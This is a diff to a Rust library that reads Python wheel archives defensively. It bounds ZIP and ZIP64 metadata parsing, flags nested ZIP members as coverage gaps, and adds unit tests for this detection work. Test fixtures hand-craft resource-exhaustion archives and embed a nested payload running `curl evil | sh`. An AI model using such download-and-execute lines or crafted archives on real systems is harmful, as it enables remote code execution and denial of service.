@@ -4,8 +4,9 @@
 //! wheel is attacker-controlled bytes, so the reader treats every field as
 //! adversarial: it streams each member through `decompressor -> real byte budget
 //! -> SHA-256 -> bounded analyzer`, never trusts a declared (header) size, never
-//! follows a member path out of the archive, and never recurses into a nested
-//! archive.
+//! follows a member path out of the archive. Nested ZIP members are detected by
+//! bytes and surfaced as explicit coverage gaps; the reader never claims they
+//! were inspected while deliberately avoiding unbounded recursive dispatch.
 //!
 //! # Two outcome classes (the central distinction)
 //!
@@ -345,6 +346,322 @@ struct CountingReader<R> {
     count: Arc<AtomicU64>,
 }
 
+const ZIP_EOCD_BYTES: usize = 22;
+const ZIP_MAX_COMMENT_BYTES: usize = u16::MAX as usize;
+const ZIP64_LOCATOR_BYTES: usize = 20;
+const ZIP64_RECORD_BASE_BYTES: usize = 56;
+/// `zip` retains the EOCD64 extensible-data sector in a boxed allocation. Cap it
+/// before invoking the dependency so an attacker cannot choose that allocation.
+const MAX_ZIP64_EXTENSIBLE_DATA_BYTES: usize = 1024 * 1024;
+/// Bound the locator-to-record search performed before `ZipArchive::new`. The
+/// extra 64 KiB permits an ordinary self-extracting prefix without making work
+/// proportional to an attacker-selected archive size.
+const MAX_ZIP64_PREFLIGHT_SEARCH_BYTES: usize =
+    MAX_ZIP64_EXTENSIBLE_DATA_BYTES + ZIP64_RECORD_BASE_BYTES + 64 * 1024;
+/// Bound how many exact-end EOCD64 signatures the dependency may try before a
+/// valid record. Every try copies its extensible sector before later validation.
+const MAX_ZIP64_PREFLIGHT_CANDIDATES: usize = 256;
+/// Bound aggregate copied sector bytes across nested exact-end candidates, not
+/// merely the peak size of one sector (which would permit quadratic work).
+const MAX_ZIP64_PREFLIGHT_AGGREGATE_EXTENSIBLE_BYTES: u64 = 4 * 1024 * 1024;
+/// Bound aggregate central-directory bytes. Entry count alone is insufficient:
+/// each entry can carry three attacker-sized u16 variable fields.
+const MAX_CENTRAL_DIRECTORY_BYTES: u64 = 16 * 1024 * 1024;
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+enum ArchivePreflight {
+    Proceed,
+    CoverageLimited {
+        kind: CoverageGapKind,
+        total_entries: Option<usize>,
+    },
+    Malformed(String),
+}
+
+fn preflight_u16(bytes: &[u8], offset: usize) -> Option<u16> {
+    let value = bytes.get(offset..offset.checked_add(2)?)?;
+    Some(u16::from_le_bytes([value[0], value[1]]))
+}
+
+fn preflight_u32(bytes: &[u8], offset: usize) -> Option<u32> {
+    let value = bytes.get(offset..offset.checked_add(4)?)?;
+    Some(u32::from_le_bytes([value[0], value[1], value[2], value[3]]))
+}
+
+fn preflight_u64(bytes: &[u8], offset: usize) -> Option<u64> {
+    let value = bytes.get(offset..offset.checked_add(8)?)?;
+    Some(u64::from_le_bytes([
+        value[0], value[1], value[2], value[3], value[4], value[5], value[6], value[7],
+    ]))
+}
+
+fn preflight_coverage_limit(kind: CoverageGapKind, total_entries: Option<u64>) -> ArchivePreflight {
+    ArchivePreflight::CoverageLimited {
+        kind,
+        total_entries: total_entries.and_then(|count| usize::try_from(count).ok()),
+    }
+}
+
+/// Read only bounded metadata needed to constrain `zip`'s eager allocations.
+///
+/// The dependency eagerly allocates its central-entry vector and copies the
+/// EOCD64 extensible-data sector in `ZipArchive::new`, before our ordinary member
+/// loop can enforce `ArchiveLimits`. This preflight accepts only an EOCD ending
+/// at EOF, caps entry/central-directory work, and locates an EOCD64 fixed header
+/// inside a bounded window. Coverage ceilings return a typed incomplete outcome;
+/// malformed metadata remains a structural rejection.
+fn preflight_archive<R: Read + Seek>(reader: &mut R, limits: &ArchiveLimits) -> ArchivePreflight {
+    let file_len = match reader.seek(std::io::SeekFrom::End(0)) {
+        Ok(len) => len,
+        Err(error) => return ArchivePreflight::Malformed(error.to_string()),
+    };
+    if file_len < ZIP_EOCD_BYTES as u64 {
+        return ArchivePreflight::Malformed("archive is shorter than an EOCD".to_string());
+    }
+
+    let tail_len = file_len.min((ZIP_EOCD_BYTES + ZIP_MAX_COMMENT_BYTES) as u64) as usize;
+    let tail_start = file_len.saturating_sub(tail_len as u64);
+    if let Err(error) = reader.seek(std::io::SeekFrom::Start(tail_start)) {
+        return ArchivePreflight::Malformed(error.to_string());
+    }
+    let mut tail = vec![0u8; tail_len];
+    if let Err(error) = reader.read_exact(&mut tail) {
+        return ArchivePreflight::Malformed(error.to_string());
+    }
+
+    let mut last_error = "could not find a bounded EOCD ending at EOF".to_string();
+    for local_eocd in (0..=tail_len - ZIP_EOCD_BYTES).rev() {
+        if tail.get(local_eocd..local_eocd + 4) != Some(b"PK\x05\x06") {
+            continue;
+        }
+        let Some(comment_len) = preflight_u16(&tail, local_eocd + 20).map(usize::from) else {
+            continue;
+        };
+        if local_eocd
+            .checked_add(ZIP_EOCD_BYTES)
+            .and_then(|end| end.checked_add(comment_len))
+            != Some(tail_len)
+        {
+            continue;
+        }
+
+        let eocd = tail_start.saturating_add(local_eocd as u64);
+        let (Some(disk), Some(central_disk), Some(disk_entries), Some(total_entries)) = (
+            preflight_u16(&tail, local_eocd + 4),
+            preflight_u16(&tail, local_eocd + 6),
+            preflight_u16(&tail, local_eocd + 8),
+            preflight_u16(&tail, local_eocd + 10),
+        ) else {
+            continue;
+        };
+        let (Some(central_size), Some(central_offset)) = (
+            preflight_u32(&tail, local_eocd + 12),
+            preflight_u32(&tail, local_eocd + 16),
+        ) else {
+            continue;
+        };
+
+        let legacy = crate::content_kind::ClassicEocdFields {
+            disk,
+            central_disk,
+            disk_entries,
+            total_entries,
+            central_size,
+            central_offset,
+        };
+        if !legacy.requires_zip64() {
+            let declared_total_entries = u64::from(total_entries);
+            // `zip` 2.4.2 locates a non-empty classic directory from the first
+            // CDFH plus the declared relative offset; it does not use the EOCD
+            // central-size field for that lookup. Apply our resource ceilings
+            // before the stricter shared layout arithmetic so an oversized
+            // attacker-controlled declaration cannot bypass the cap merely by
+            // also being inconsistent with the physical directory.
+            if declared_total_entries != 0 {
+                if declared_total_entries > limits.max_entries as u64 {
+                    return preflight_coverage_limit(
+                        CoverageGapKind::EntryCountCapped,
+                        Some(declared_total_entries),
+                    );
+                }
+                if u64::from(central_size) > MAX_CENTRAL_DIRECTORY_BYTES {
+                    return preflight_coverage_limit(
+                        CoverageGapKind::Truncated,
+                        Some(declared_total_entries),
+                    );
+                }
+            }
+            let layout = match crate::content_kind::validate_zip_eocd_layout(
+                eocd,
+                u64::from(disk),
+                u64::from(central_disk),
+                u64::from(disk_entries),
+                u64::from(total_entries),
+                u64::from(central_size),
+                u64::from(central_offset),
+            ) {
+                Ok(layout) => layout,
+                Err(error) => {
+                    last_error = format!("invalid classic EOCD layout: {error}");
+                    continue;
+                }
+            };
+            if layout.total_entries == 0 {
+                return ArchivePreflight::Proceed;
+            }
+            return ArchivePreflight::Proceed;
+        }
+
+        let Some(local_locator) = local_eocd.checked_sub(ZIP64_LOCATOR_BYTES) else {
+            last_error = "ZIP64 locator does not fit before EOCD".to_string();
+            continue;
+        };
+        if tail.get(local_locator..local_locator + 4) != Some(b"PK\x06\x07") {
+            last_error = "ZIP64 sentinel EOCD has no locator".to_string();
+            continue;
+        }
+        let (Some(locator_disk), Some(declared_record), Some(locator_disks)) = (
+            preflight_u32(&tail, local_locator + 4),
+            preflight_u64(&tail, local_locator + 8),
+            preflight_u32(&tail, local_locator + 16),
+        ) else {
+            continue;
+        };
+        if locator_disk != 0 || locator_disks != 1 {
+            last_error = "multi-disk ZIP64 locator is unsupported".to_string();
+            continue;
+        }
+        let locator = tail_start.saturating_add(local_locator as u64);
+        if declared_record >= locator {
+            last_error = "ZIP64 locator record offset is inconsistent".to_string();
+            continue;
+        }
+        let search_len = locator.saturating_sub(declared_record);
+        if search_len > MAX_ZIP64_PREFLIGHT_SEARCH_BYTES as u64 {
+            // Searching farther would make work proportional to attacker input;
+            // importantly, return before `zip` can allocate the sector itself.
+            return preflight_coverage_limit(CoverageGapKind::Truncated, None);
+        }
+        let Ok(search_len_usize) = usize::try_from(search_len) else {
+            return preflight_coverage_limit(CoverageGapKind::Truncated, None);
+        };
+        if let Err(error) = reader.seek(std::io::SeekFrom::Start(declared_record)) {
+            return ArchivePreflight::Malformed(error.to_string());
+        }
+        let mut search = vec![0u8; search_len_usize];
+        if let Err(error) = reader.read_exact(&mut search) {
+            return ArchivePreflight::Malformed(error.to_string());
+        }
+
+        let mut bounded_candidate_valid = false;
+        let mut exact_end_candidates = 0usize;
+        let mut aggregate_extensible_bytes = 0u64;
+        for local_record in (0..search_len_usize.saturating_sub(4)).rev() {
+            if search.get(local_record..local_record + 4) != Some(b"PK\x06\x06") {
+                continue;
+            }
+            let Some(record_size) = preflight_u64(&search, local_record + 4) else {
+                continue;
+            };
+            if record_size < 44
+                || (local_record as u64)
+                    .checked_add(12)
+                    .and_then(|end| end.checked_add(record_size))
+                    != Some(search_len)
+            {
+                continue;
+            }
+            let extensible_size = record_size.saturating_sub(44);
+            exact_end_candidates = exact_end_candidates.saturating_add(1);
+            aggregate_extensible_bytes = aggregate_extensible_bytes.saturating_add(extensible_size);
+            if exact_end_candidates > MAX_ZIP64_PREFLIGHT_CANDIDATES
+                || aggregate_extensible_bytes > MAX_ZIP64_PREFLIGHT_AGGREGATE_EXTENSIBLE_BYTES
+            {
+                return preflight_coverage_limit(CoverageGapKind::Truncated, None);
+            }
+            // `zip` allocates this sector while parsing the candidate, before it
+            // checks the remaining fixed fields. Therefore every exact-end
+            // candidate the dependency can visit must respect the cap; a later
+            // small nested record cannot shadow an earlier oversized record.
+            if extensible_size > MAX_ZIP64_EXTENSIBLE_DATA_BYTES as u64 {
+                return preflight_coverage_limit(CoverageGapKind::Truncated, None);
+            }
+            let (Some(version_made), Some(version_needed)) = (
+                preflight_u16(&search, local_record + 12),
+                preflight_u16(&search, local_record + 14),
+            ) else {
+                continue;
+            };
+            let (Some(record_disk), Some(record_central_disk)) = (
+                preflight_u32(&search, local_record + 16),
+                preflight_u32(&search, local_record + 20),
+            ) else {
+                continue;
+            };
+            let (Some(record_disk_entries), Some(record_total_entries)) = (
+                preflight_u64(&search, local_record + 24),
+                preflight_u64(&search, local_record + 32),
+            ) else {
+                continue;
+            };
+            let (Some(record_central_size), Some(record_central_offset)) = (
+                preflight_u64(&search, local_record + 40),
+                preflight_u64(&search, local_record + 48),
+            ) else {
+                continue;
+            };
+            if version_needed > version_made {
+                continue;
+            }
+            // As with classic EOCD metadata, enforce the work ceilings before
+            // layout arithmetic. The locked reader does not use the ZIP64
+            // central-size field to locate the directory, so a forged
+            // over-limit declaration is still a cap hit, not a path around it.
+            if record_total_entries != 0 {
+                if record_total_entries > limits.max_entries as u64 {
+                    return preflight_coverage_limit(
+                        CoverageGapKind::EntryCountCapped,
+                        Some(record_total_entries),
+                    );
+                }
+                if record_central_size > MAX_CENTRAL_DIRECTORY_BYTES {
+                    return preflight_coverage_limit(
+                        CoverageGapKind::Truncated,
+                        Some(record_total_entries),
+                    );
+                }
+            }
+            let record = declared_record.saturating_add(local_record as u64);
+            let layout = match crate::content_kind::validate_zip_eocd_layout(
+                record,
+                u64::from(record_disk),
+                u64::from(record_central_disk),
+                record_disk_entries,
+                record_total_entries,
+                record_central_size,
+                record_central_offset,
+            ) {
+                Ok(layout) if legacy.matches_zip64_layout(layout) => layout,
+                Ok(_) | Err(_) => continue,
+            };
+            if layout.total_entries == 0 {
+                bounded_candidate_valid = true;
+                continue;
+            }
+            if record.saturating_sub(layout.archive_start) != declared_record {
+                continue;
+            }
+            bounded_candidate_valid = true;
+        }
+        if bounded_candidate_valid {
+            return ArchivePreflight::Proceed;
+        }
+        last_error = "could not validate ZIP64 record inside bounded window".to_string();
+    }
+
+    ArchivePreflight::Malformed(last_error)
+}
+
 impl<R: Read> Read for CountingReader<R> {
     fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
         let n = self.inner.read(buf)?;
@@ -360,12 +677,45 @@ impl<R: Seek> Seek for CountingReader<R> {
 }
 
 pub fn read_wheel<R: Read + Seek>(
-    reader: R,
+    mut reader: R,
     outer_name: &str,
     outer_sha256: &str,
     limits: &ArchiveLimits,
     visitor: &mut dyn MemberVisitor,
 ) -> ArchiveOutcome {
+    match preflight_archive(&mut reader, limits) {
+        ArchivePreflight::Proceed => {}
+        ArchivePreflight::CoverageLimited {
+            kind,
+            total_entries,
+        } => {
+            let mut inspection = ArtifactInspection::new(generic_subject(outer_name, outer_sha256));
+            if let Some(total_entries) = total_entries {
+                inspection.coverage.members_total = total_entries;
+            }
+            inspection.coverage.gaps.push(CoverageGap {
+                location: SubjectLocation::from_path(outer_name),
+                kind,
+                sha256: Some(outer_sha256.to_string()),
+            });
+            return ArchiveOutcome::Accepted(inspection);
+        }
+        ArchivePreflight::Malformed(detail) => {
+            return ArchiveOutcome::Rejected {
+                violations: vec![ArchiveViolation::MalformedArchive { detail }],
+                partial: ArtifactInspection::new(generic_subject(outer_name, outer_sha256)),
+            };
+        }
+    }
+    if let Err(error) = reader.seek(std::io::SeekFrom::Start(0)) {
+        return ArchiveOutcome::Rejected {
+            violations: vec![ArchiveViolation::MalformedArchive {
+                detail: error.to_string(),
+            }],
+            partial: ArtifactInspection::new(generic_subject(outer_name, outer_sha256)),
+        };
+    }
+
     let read_counter = Arc::new(AtomicU64::new(0));
     let mut archive = match zip::ZipArchive::new(CountingReader {
         inner: reader,
@@ -569,6 +919,22 @@ pub fn read_wheel<R: Read + Seek>(
                     sha256: sha256.clone(),
                     kind,
                 });
+
+                // A member whose BYTES are themselves a ZIP is a second archive
+                // boundary, even when its suffix looks innocuous. We have fully
+                // streamed and hashed the member, but have not inspected its
+                // descendants under this archive's shared budgets. Record that
+                // explicit gap and do not increment `members_inspected`; doing so
+                // would turn a deliberately skipped nested archive into a false
+                // claim of complete coverage.
+                if is_nested_zip_member(&bytes) {
+                    inspection.coverage.gaps.push(CoverageGap {
+                        location,
+                        kind: CoverageGapKind::Unsupported,
+                        sha256: Some(sha256),
+                    });
+                    continue;
+                }
                 inspection.coverage.members_inspected += 1;
 
                 // Capture dist-info METADATA for the identity check.
@@ -1101,6 +1467,15 @@ fn has_dotdot_segment(name: &str) -> bool {
     name.split(['/', '\\']).any(|seg| seg == "..")
 }
 
+/// Whether a completely streamed member opens another ZIP analysis boundary.
+/// Byte identity is authoritative: a `.zip`-named text resource is ordinary
+/// content, while an extensionless ZIP or PDF-first ZIP polyglot is incomplete
+/// unless its descendants are analyzed separately.
+fn is_nested_zip_member(bytes: &[u8]) -> bool {
+    crate::content_kind::classify_archive_prefix(bytes) == crate::content_kind::ArchiveMagic::Zip
+        || crate::content_kind::has_trailing_zip_boundary(bytes)
+}
+
 /// Classify an archive member path into the coarse [`ArtifactFileKind`] B5 to B8
 /// correlate over. Mirrors the kinds the A3 model defines; a `.pth` is its OWN
 /// kind, never a binary blob.
@@ -1606,6 +1981,31 @@ mod tests {
                 b"demo/__init__.py,sha256=abc,15\n",
             )
             .build()
+    }
+
+    /// Hand-build an empty ZIP64 archive with an exact extensible-data sector.
+    /// This shape isolates the allocation `zip` would perform while keeping the
+    /// central directory and member count at zero.
+    fn empty_zip64_with_extensible_sector(extensible_bytes: usize) -> Vec<u8> {
+        let mut bytes = vec![0u8; ZIP64_RECORD_BASE_BYTES + extensible_bytes];
+        bytes[..4].copy_from_slice(b"PK\x06\x06");
+        bytes[4..12].copy_from_slice(&(44u64 + extensible_bytes as u64).to_le_bytes());
+        bytes[12..14].copy_from_slice(&45u16.to_le_bytes());
+        bytes[14..16].copy_from_slice(&45u16.to_le_bytes());
+
+        let mut locator = [0u8; ZIP64_LOCATOR_BYTES];
+        locator[..4].copy_from_slice(b"PK\x06\x07");
+        locator[16..20].copy_from_slice(&1u32.to_le_bytes());
+        bytes.extend_from_slice(&locator);
+
+        let mut eocd = [0u8; ZIP_EOCD_BYTES];
+        eocd[..4].copy_from_slice(b"PK\x05\x06");
+        eocd[8..10].copy_from_slice(&u16::MAX.to_le_bytes());
+        eocd[10..12].copy_from_slice(&u16::MAX.to_le_bytes());
+        eocd[12..16].copy_from_slice(&u32::MAX.to_le_bytes());
+        eocd[16..20].copy_from_slice(&u32::MAX.to_le_bytes());
+        bytes.extend_from_slice(&eocd);
+        bytes
     }
 
     /// Helper: read a wheel from bytes with default limits, no native visitor.
@@ -2125,9 +2525,301 @@ mod tests {
             .iter()
             .any(|g| g.kind == CoverageGapKind::EntryCountCapped));
         assert_eq!(inspection.coverage.members_total, 10);
-        assert_eq!(inspection.coverage.members_enumerated, 3);
-        assert_eq!(inspection.coverage.members_inspected, 3);
+        assert_eq!(inspection.coverage.members_enumerated, 0);
+        assert_eq!(inspection.coverage.members_inspected, 0);
         assert!(!inspection.coverage.is_complete());
+    }
+
+    #[test]
+    fn entry_count_exactly_at_cap_still_reaches_full_inspection() {
+        let mut builder = ZipBuilder::new();
+        for index in 0..3 {
+            builder = builder.file(&format!("demo/f{index}.py"), b"x");
+        }
+        let bytes = builder.build();
+        let sha = sha256_hex(&bytes);
+        let limits = ArchiveLimits {
+            max_entries: 3,
+            ..ArchiveLimits::default()
+        };
+        struct NoopVisitor;
+        impl MemberVisitor for NoopVisitor {}
+        let outcome = read_wheel(
+            Cursor::new(bytes),
+            "demo-1.0-py3-none-any.whl",
+            &sha,
+            &limits,
+            &mut NoopVisitor,
+        );
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("entry count at cap must remain supported: {other:?}"),
+        };
+        assert_eq!(inspection.coverage.members_total, 3);
+        assert_eq!(inspection.coverage.members_inspected, 3);
+        assert!(inspection.coverage.is_complete());
+    }
+
+    #[test]
+    fn forged_oversized_central_directory_is_bounded_before_zip_parser() {
+        let mut bytes = ZipBuilder::new().file("demo/member.py", b"x").build();
+        let eocd = bytes
+            .windows(4)
+            .rposition(|window| window == b"PK\x05\x06")
+            .expect("test archive has an EOCD");
+        bytes[eocd + 12..eocd + 16]
+            .copy_from_slice(&((MAX_CENTRAL_DIRECTORY_BYTES + 1) as u32).to_le_bytes());
+
+        let locked_reader = zip::ZipArchive::new(Cursor::new(&bytes))
+            .expect("zip 2.4.2 accepts the ignored forged central-size field");
+        assert_eq!(locked_reader.len(), 1);
+
+        let outcome = read_bytes(&bytes, "demo-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("central-directory work cap must be incomplete: {other:?}"),
+        };
+        assert_eq!(inspection.coverage.members_enumerated, 0);
+        assert_eq!(inspection.coverage.gaps.len(), 1);
+        assert_eq!(inspection.coverage.gaps[0].kind, CoverageGapKind::Truncated);
+    }
+
+    #[test]
+    fn zip64_extensible_sector_cap_is_enforced_before_dependency_allocation() {
+        let bytes =
+            empty_zip64_with_extensible_sector(MAX_ZIP64_EXTENSIBLE_DATA_BYTES.saturating_add(1));
+        let outcome = read_bytes(&bytes, "empty-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("EOCD64 work cap must be a coverage limit, got {other:?}"),
+        };
+        assert_eq!(inspection.coverage.members_total, 0);
+        assert_eq!(inspection.coverage.members_enumerated, 0);
+        assert_eq!(inspection.coverage.members_inspected, 0);
+        assert!(inspection.coverage.gaps.iter().any(|gap| {
+            gap.kind == CoverageGapKind::Truncated
+                && gap.location.to_string() == "empty-1.0-py3-none-any.whl"
+        }));
+        assert!(!inspection.coverage.is_complete());
+    }
+
+    #[test]
+    fn zip64_extensible_sector_at_cap_remains_supported() {
+        let bytes = empty_zip64_with_extensible_sector(MAX_ZIP64_EXTENSIBLE_DATA_BYTES);
+        let outcome = read_bytes(&bytes, "empty-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("EOCD64 sector at the exact cap must remain supported: {other:?}"),
+        };
+        assert!(inspection.coverage.gaps.is_empty());
+        assert_eq!(inspection.coverage.members_total, 0);
+        assert!(inspection.coverage.is_complete());
+    }
+
+    #[test]
+    fn nested_small_zip64_record_cannot_shadow_over_limit_authoritative_record() {
+        let mut bytes = ZipBuilder::new()
+            .file("demo/a.py", b"a")
+            .file("demo/b.py", b"b")
+            .build();
+        let classic_eocd = bytes
+            .windows(4)
+            .rposition(|window| window == b"PK\x05\x06")
+            .expect("test archive has an EOCD");
+        let central_size = u32::from_le_bytes(
+            bytes[classic_eocd + 12..classic_eocd + 16]
+                .try_into()
+                .unwrap(),
+        );
+        let central_offset = u32::from_le_bytes(
+            bytes[classic_eocd + 16..classic_eocd + 20]
+                .try_into()
+                .unwrap(),
+        );
+        bytes.truncate(classic_eocd);
+
+        let outer_record = bytes.len();
+        let mut record = vec![0u8; ZIP64_RECORD_BASE_BYTES + 64];
+        record[..4].copy_from_slice(b"PK\x06\x06");
+        record[4..12].copy_from_slice(&108u64.to_le_bytes());
+        record[12..14].copy_from_slice(&45u16.to_le_bytes());
+        record[14..16].copy_from_slice(&45u16.to_le_bytes());
+        record[24..32].copy_from_slice(&2u64.to_le_bytes());
+        record[32..40].copy_from_slice(&2u64.to_le_bytes());
+        record[40..48].copy_from_slice(&u64::from(central_size).to_le_bytes());
+        record[48..56].copy_from_slice(&u64::from(central_offset).to_le_bytes());
+        bytes.extend_from_slice(&record);
+
+        // A later exact-end record inside the outer record's extension looks
+        // like a bounded empty SFX archive. Reverse-only preflight used to
+        // accept it and never inspect the authoritative earlier record.
+        let nested_record = outer_record + 64;
+        bytes[nested_record..nested_record + 4].copy_from_slice(b"PK\x06\x06");
+        bytes[nested_record + 4..nested_record + 12].copy_from_slice(&44u64.to_le_bytes());
+        bytes[nested_record + 12..nested_record + 14].copy_from_slice(&45u16.to_le_bytes());
+        bytes[nested_record + 14..nested_record + 16].copy_from_slice(&45u16.to_le_bytes());
+        bytes[nested_record + 48..nested_record + 56]
+            .copy_from_slice(&(outer_record as u64).to_le_bytes());
+
+        let mut locator = [0u8; ZIP64_LOCATOR_BYTES];
+        locator[..4].copy_from_slice(b"PK\x06\x07");
+        locator[8..16].copy_from_slice(&(outer_record as u64).to_le_bytes());
+        locator[16..20].copy_from_slice(&1u32.to_le_bytes());
+        bytes.extend_from_slice(&locator);
+        let mut eocd = [0u8; ZIP_EOCD_BYTES];
+        eocd[..4].copy_from_slice(b"PK\x05\x06");
+        eocd[8..10].copy_from_slice(&u16::MAX.to_le_bytes());
+        eocd[10..12].copy_from_slice(&u16::MAX.to_le_bytes());
+        eocd[12..16].copy_from_slice(&u32::MAX.to_le_bytes());
+        eocd[16..20].copy_from_slice(&u32::MAX.to_le_bytes());
+        bytes.extend_from_slice(&eocd);
+
+        let sha = sha256_hex(&bytes);
+        let limits = ArchiveLimits {
+            max_entries: 1,
+            ..ArchiveLimits::default()
+        };
+        struct NoopVisitor;
+        impl MemberVisitor for NoopVisitor {}
+        let outcome = read_wheel(
+            Cursor::new(bytes),
+            "demo-1.0-py3-none-any.whl",
+            &sha,
+            &limits,
+            &mut NoopVisitor,
+        );
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("entry preflight cap must remain a gap: {other:?}"),
+        };
+        assert_eq!(inspection.coverage.members_total, 2);
+        assert_eq!(inspection.coverage.members_enumerated, 0);
+        assert_eq!(inspection.coverage.gaps.len(), 1);
+        assert_eq!(
+            inspection.coverage.gaps[0].kind,
+            CoverageGapKind::EntryCountCapped
+        );
+    }
+
+    #[test]
+    fn huge_zip64_locator_span_stops_before_reading_attacker_sized_sector() {
+        let bytes =
+            empty_zip64_with_extensible_sector(MAX_ZIP64_PREFLIGHT_SEARCH_BYTES.saturating_add(1));
+        let outcome = read_bytes(&bytes, "empty-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("oversized EOCD64 search must be incomplete, got {other:?}"),
+        };
+        assert_eq!(inspection.coverage.gaps.len(), 1);
+        assert_eq!(inspection.coverage.gaps[0].kind, CoverageGapKind::Truncated);
+    }
+
+    #[test]
+    fn zip64_exact_end_signature_flood_has_aggregate_work_cap() {
+        let candidate_count = MAX_ZIP64_PREFLIGHT_CANDIDATES + 2;
+        let locator_offset = candidate_count * ZIP64_RECORD_BASE_BYTES;
+        let mut bytes = vec![0u8; locator_offset];
+        for index in 0..candidate_count {
+            let record = index * ZIP64_RECORD_BASE_BYTES;
+            let record_size = locator_offset - record - 12;
+            bytes[record..record + 4].copy_from_slice(b"PK\x06\x06");
+            bytes[record + 4..record + 12].copy_from_slice(&(record_size as u64).to_le_bytes());
+            // Every earlier candidate is rejected only after its extensible
+            // sector has been copied. The final candidate is valid, so a parser
+            // without aggregate work accounting visits the entire flood.
+            bytes[record + 14..record + 16].copy_from_slice(&45u16.to_le_bytes());
+            if index + 1 == candidate_count {
+                bytes[record + 12..record + 14].copy_from_slice(&45u16.to_le_bytes());
+            }
+        }
+
+        let mut locator = [0u8; ZIP64_LOCATOR_BYTES];
+        locator[..4].copy_from_slice(b"PK\x06\x07");
+        locator[16..20].copy_from_slice(&1u32.to_le_bytes());
+        bytes.extend_from_slice(&locator);
+        let mut eocd = [0u8; ZIP_EOCD_BYTES];
+        eocd[..4].copy_from_slice(b"PK\x05\x06");
+        eocd[8..10].copy_from_slice(&u16::MAX.to_le_bytes());
+        eocd[10..12].copy_from_slice(&u16::MAX.to_le_bytes());
+        eocd[12..16].copy_from_slice(&u32::MAX.to_le_bytes());
+        eocd[16..20].copy_from_slice(&u32::MAX.to_le_bytes());
+        bytes.extend_from_slice(&eocd);
+
+        let outcome = read_bytes(&bytes, "flood-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("ZIP64 candidate work cap must be incomplete: {other:?}"),
+        };
+        assert_eq!(inspection.coverage.gaps.len(), 1);
+        assert_eq!(inspection.coverage.gaps[0].kind, CoverageGapKind::Truncated);
+        assert_eq!(inspection.coverage.members_enumerated, 0);
+    }
+
+    #[test]
+    fn nested_zip_member_is_an_explicit_gap_and_not_fully_inspected() {
+        let nested = ZipBuilder::new()
+            .file("payload.py", b"import os; os.system('curl evil | sh')\n")
+            .build();
+        let nested_sha = sha256_hex(&nested);
+        let bytes = ZipBuilder::new()
+            .stored("demo/assets/blob", &nested)
+            .file("demo-1.0.dist-info/METADATA", b"Name: demo\nVersion: 1.0\n")
+            .build();
+        let outcome = read_bytes(&bytes, "demo-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("nested ZIP is a coverage gap, not rejection: {other:?}"),
+        };
+        assert_eq!(inspection.coverage.members_total, 2);
+        assert_eq!(inspection.coverage.members_enumerated, 2);
+        assert_eq!(inspection.coverage.members_inspected, 1);
+        assert!(inspection.coverage.gaps.iter().any(|gap| {
+            gap.kind == CoverageGapKind::Unsupported
+                && gap.location.to_string().ends_with("demo/assets/blob")
+                && gap.sha256.as_deref() == Some(nested_sha.as_str())
+        }));
+        assert!(!inspection.coverage.is_complete());
+    }
+
+    #[test]
+    fn self_extracting_prefixed_nested_zip_is_also_an_explicit_gap() {
+        let nested_zip = ZipBuilder::new()
+            .file("payload.py", b"print('nested execution')\n")
+            .build();
+        let mut self_extracting = b"#!/bin/sh\nexit 0\n".to_vec();
+        self_extracting.extend_from_slice(&nested_zip);
+        let nested_sha = sha256_hex(&self_extracting);
+        let bytes = ZipBuilder::new()
+            .stored("demo/assets/launcher", &self_extracting)
+            .build();
+
+        let outcome = read_bytes(&bytes, "demo-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("prefixed nested ZIP must be incomplete, not rejected: {other:?}"),
+        };
+        assert_eq!(inspection.coverage.members_total, 1);
+        assert_eq!(inspection.coverage.members_inspected, 0);
+        assert!(inspection.coverage.gaps.iter().any(|gap| {
+            gap.kind == CoverageGapKind::Unsupported
+                && gap.location.to_string().ends_with("demo/assets/launcher")
+                && gap.sha256.as_deref() == Some(nested_sha.as_str())
+        }));
+    }
+
+    #[test]
+    fn zip_named_plain_resource_is_not_a_nested_archive_gap() {
+        let bytes = ZipBuilder::new()
+            .stored("demo/assets/readme.zip", b"this is ordinary UTF-8 text")
+            .build();
+        let outcome = read_bytes(&bytes, "demo-1.0-py3-none-any.whl");
+        let inspection = match outcome {
+            ArchiveOutcome::Accepted(inspection) => inspection,
+            other => panic!("a plain resource must remain fully inspected: {other:?}"),
+        };
+        assert!(inspection.coverage.gaps.is_empty());
+        assert_eq!(inspection.coverage.members_inspected, 1);
+        assert!(inspection.coverage.is_complete());
     }
 
     #[test]
